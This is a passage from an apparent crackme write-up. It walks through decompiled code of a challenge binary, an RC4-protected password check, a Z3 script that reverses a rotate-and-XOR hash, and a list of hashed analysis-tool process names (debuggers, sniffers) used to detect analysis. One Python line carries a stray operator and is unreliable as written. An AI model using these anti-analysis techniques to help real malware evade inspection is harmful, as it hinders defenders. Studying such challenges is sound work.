<p>To be honest, I did not try any of these because the checks are only run once after the second stage payload is executed, meaning we can just start our analysis tools after entering the 1st password and waiting a few millisec for level2.exe to kick in&hellip;</p>
<p>This is what i found the easiest and most practical for me here:</p>
<ol>
<li>start the crackme</li>
<li>enter the 1st password</li>
<li>start the debugger and attach to level2.exe</li>
<li>profit!</li>
</ol>
<p>After the 2nd step, the debug checks are not called again and we can freely play, no need to make it more complex than it needs to be.</p>
<h3 id="28-core-business">2.8 Core business</h3>
<p>Let&rsquo;s continue the exploration and look at the <code>stage2_and_3_lets_go(&quot;\\\\.\\pipe\\crackme_pipe&quot;, 1337)</code> function.</p>
<p>It starts 2 threads: one for level2 and one for level3</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">th_stage2_param</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">pipe_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage2_param</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">check_stage2_password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage2</span> <span class="o">=</span> <span class="n">create_stage2_thread</span><span class="p">(</span><span class="n">th_stage2_param</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">th_stage2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage3_param</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">int_1337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage3_param</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">check_stage3_password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage3</span> <span class="o">=</span> <span class="n">create_stage3_thread</span><span class="p">(</span><span class="n">th_stage3_param</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">th_stage3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
</span></span></code></pre></div><p>You can dig into the create_stageX_thread functions by yourself, i dont think there&rsquo;s anything worth mentioning.
Basically stage2 reads input from a named pipe, stage3 listen on 127.0.0.1:1337 to do the same.</p>
<p>The function that verifies the level 2 password received from the frontend is the one i renamed <code>check_stage2_password</code></p>
<h3 id="29-check_stage2_password---the-return-of-the-hashes">2.9 check_stage2_password() - the return of the hashes</h3>
<p>This function starts by initializing a byte array:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xF158955A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xB5626D7C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xD68AC6C2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10F6F220</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4CEF8FD8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8B4663D6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA2BE0D1A</span><span class="p">;</span>
</span></span></code></pre></div><p>then removes the trailing spaces (including \r\n) of the input password and computes its hash using the same algorithm than for the anti analysis process check:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">remove_trailing_spaces</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password_from_pipe</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v32</span><span class="p">,</span> <span class="n">v16</span><span class="p">,</span> <span class="n">v32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a7</span> <span class="o">&lt;</span> <span class="mh">0x10</span> <span class="o">||</span> <span class="p">(</span><span class="n">password</span> <span class="o">=</span> <span class="n">password_from_pipe</span><span class="p">,</span> <span class="p">(</span><span class="n">v33</span> <span class="o">=</span> <span class="n">password_from_pipe</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">hash</span> <span class="o">=</span> <span class="mh">0xBADC0FFE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">password_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">n_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">password_len</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">do</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">password_char_lower</span> <span class="o">=</span> <span class="n">tolower</span><span class="p">(</span><span class="n">password</span><span class="p">[</span><span class="n">n_1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">v33</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">++</span><span class="n">n_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash</span> <span class="o">=</span> <span class="n">password_char_lower</span> <span class="o">^</span> <span class="n">__ROL4__</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">while</span> <span class="p">(</span> <span class="n">n_1</span> <span class="o">&lt;</span> <span class="n">password_len</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>afterwards it checks if the hash exists in the global list of hashes that has been initialized earlier, and if it does, uses the input password to decrypt the byte array:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">key</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">password_from_pipe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">rc4_decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">key_len</span><span class="p">,</span> <span class="n">crypted</span><span class="p">,</span> <span class="mh">0x1Du</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">some_chr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">crypted</span> <span class="o">+</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">some_chr</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">some_chr</span> <span class="o">&gt;=</span> <span class="sc">&#39; &#39;</span> <span class="o">&amp;&amp;</span> <span class="n">some_chr</span> <span class="o">!=</span> <span class="sc">&#39;\x7F&#39;</span> <span class="o">||</span> <span class="n">some_chr</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">||</span> <span class="n">some_chr</span> <span class="o">==</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">29</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">INVALID_PASSWORD</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>and checks that the result is more or less ascii printable</p>
<h5 id="note-the-decryption-algorithm-is-rc4">Note: The decryption algorithm is RC4.</h5>
<blockquote>
<p>RC4 is usually pretty easy to spot:</p>
<p>When you see a first loop initializing a 256 bytes array [0, 1, 2, &hellip;, 255], then a second loop with some permutations and 3rd loop with some XOR&rsquo;ing, you can be suspicious it&rsquo;s RC4: This <a href="https://en.wikipedia.org/wiki/RC4">Wikipedia page</a> shows it well.</p>
<p>In this case it turned out to be plain normal RC4.</p>
</blockquote>
<h3 id="210-finding-the-password">2.10 Finding the password</h3>
<p>At this point it&rsquo;s pretty clear that:</p>
<ul>
<li>the password needs to match one the hashes</li>
<li>the result of the RC4 decryption of the byte array with this password needs to be ascii printable</li>
</ul>
<p>So we just need to reverse the hashes and one of them must be the password ! right ?</p>
<p>With the help of Z3, this script will generate lowercase strings of a given length matching a given hash.
(PS: Z3 is great, use it and abuse it)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve_hash</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">chr_lst</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;c</span><span class="si">%d</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">x</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># lowercase letters + 3 2 6 4 _ -</span>
</span></span><span class="line"><span class="cl">                <span class="n">Or</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Or</span><span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="mi">51</span><span class="p">,</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">50</span><span class="p">,</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">54</span><span class="p">,</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">52</span><span class="p">,</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">95</span><span class="p">,</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">45</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">And</span><span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="mi">97</span><span class="p">,</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">chr_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="mh">0xbadc0ffe</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chr_lst</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">RotateLeft</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">^</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="n">h</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1"># keep going while we have solutions</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cond</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pwd</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chr_lst</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">pwd</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">chr_lst</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">cond</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">chr_lst</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">chr_lst</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># just dont print the same solution twice</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">cond</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hash = 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">h</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solve_hash</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span></span></code></pre></div><p>While this works well for short strings, the number of collisions goes up exponentially and the method quickly reaches its limits:</p>
<pre tabindex="0"><code>% ./reverse_hash.py 0x5D9F9FD8 5
hash = 0x5d9f9fd8
% ./reverse_hash.py 0x5D9F9FD8 6
hash = 0x5d9f9fd8
x32dbg
zqrdbg
zs2dbg
% ./reverse_hash.py 0x5D9F9FD8 8 | wc -l
128
% ./reverse_hash.py 0x5D9F9FD8 9 | wc -l
17516
</code></pre><p>Notice that we found the hash for <code>x32dbg</code>.</p>
<p>So i tried it this way on short string lengths, also checked the hashes of the sysinternals tools and whatever analysis tool came to my mind, but i was still left with some unresolved hashes.</p>
<p>Until i put all the hashes i already had &ldquo;reversed&rdquo; together in a single google query and found this:
<a href="https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiAnalysis/process.cpp">https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiAnalysis/process.cpp</a></p>
<p>which turned to be the almost complete list of executable names matching the hashes.<br>
At this stage i had all but one hashes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xC81D63C9</span><span class="p">;</span>                 <span class="c1">// ollydbg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5B2839AC</span><span class="p">;</span>                 <span class="c1">// processhacker
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x17DAD73F</span><span class="p">;</span>                 <span class="c1">// tcpview
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x72C7241C</span><span class="p">;</span>                 <span class="c1">// autoruns
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x58E483ED</span><span class="p">;</span>                 <span class="c1">// autorunsc
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x82134662</span><span class="p">;</span>                 <span class="c1">// filemon
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34204667</span><span class="p">;</span>                 <span class="c1">// procmon
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4CD53A71</span><span class="p">;</span>                 <span class="c1">// regmon
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34206499</span><span class="p">;</span>                 <span class="c1">// procexp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFDEB191</span><span class="p">;</span>                 <span class="c1">// idaq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7AC6410B</span><span class="p">;</span>                <span class="c1">// idaq64
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xEA3503AA</span><span class="p">;</span>                <span class="c1">// ImmunityDebugger
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xCCFA2924</span><span class="p">;</span>                <span class="c1">// wireshark
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3A09FFBC</span><span class="p">;</span>                <span class="c1">// dumpcap
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x38EA0C1B</span><span class="p">;</span>                <span class="c1">// HookExplorer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x58E479EC</span><span class="p">;</span>                <span class="c1">// ImportREC
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1B964E1A</span><span class="p">;</span>                <span class="c1">// petools
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x707F9D9A</span><span class="p">;</span>                <span class="c1">// lordpe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xF5A79701</span><span class="p">;</span>                <span class="c1">// SysInspector
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9F5473B</span><span class="p">;</span>                 <span class="c1">// proc_analyzer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xBA635AC6</span><span class="p">;</span>                <span class="c1">// sysAnalyzer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xBB18A65</span><span class="p">;</span>                 <span class="c1">// sniff_hit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x46119FD8</span><span class="p">;</span>                <span class="c1">// windbg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFB7BF6AF</span><span class="p">;</span>                <span class="c1">// joeboxcontrol
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3F75D54B</span><span class="p">;</span>                <span class="c1">// joeboxserver
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x49110E9F</span><span class="p">;</span>                <span class="c1">// ResourceHacker
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D9F9FD8</span><span class="p">;</span>                <span class="c1">// x32dbg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5DCC9FD8</span><span class="p">;</span>                <span class="c1">// x64dbg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8293C33E</span><span class="p">;</span>                <span class="c1">// fiddler
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D112314</span><span class="p">;</span>                <span class="c1">// httpdebugger
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9D9F8189</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">process_hash</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xC10AE786</span><span class="p">;</span>                <span class="c1">// pe-sieve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x67D8B725</span><span class="p">;</span>                <span class="c1">// hollows_hunter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">process_hash</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7FE9020</span><span class="p">;</span>                 <span class="c1">// pin
</span></span></span></code></pre></div><p>I tried them all as input password: no luck.
I thought it would match the last hash i was missing, so i tried bruteforcing solutions&hellip; but it was just too long and probably not the correct path to the solution anyway.</p>
<p>Out of despair, i threw in a file whatever executable name i had and tried the RC4 decrypt:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printable_ascii</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#import struct</span>
</span></span><span class="line"><span class="cl"><span class="c1">#crypt_v = [0xF158955A, 0xB5626D7C, 0xD68AC6C2, 0x10F6F220, 0x4CEF8FD8, 0x8B4663D6, 0xA2BE0D1A]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#crypt = b&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#for v in crypt_v:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    crypt += struct.pack(&#39;&lt;I&#39;, v)</span>
</span></span><span class="line"><span class="cl"><span class="n">crypt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;Z</span><span class="se">\x95</span><span class="s1">X</span><span class="se">\xf1</span><span class="s1">|mb</span><span class="se">\xb5\xc2\xc6\x8a\xd6</span><span class="s1"> </span><span class="se">\xf2\xf6\x10\xd8\x8f\xef</span><span class="s1">L</span><span class="se">\xd6</span><span class="s1">cF</span><span class="se">\x8b\x1a\r\xbe\xa2</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;executable_names.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">crypt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">dec</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">b</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">printable_ascii</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
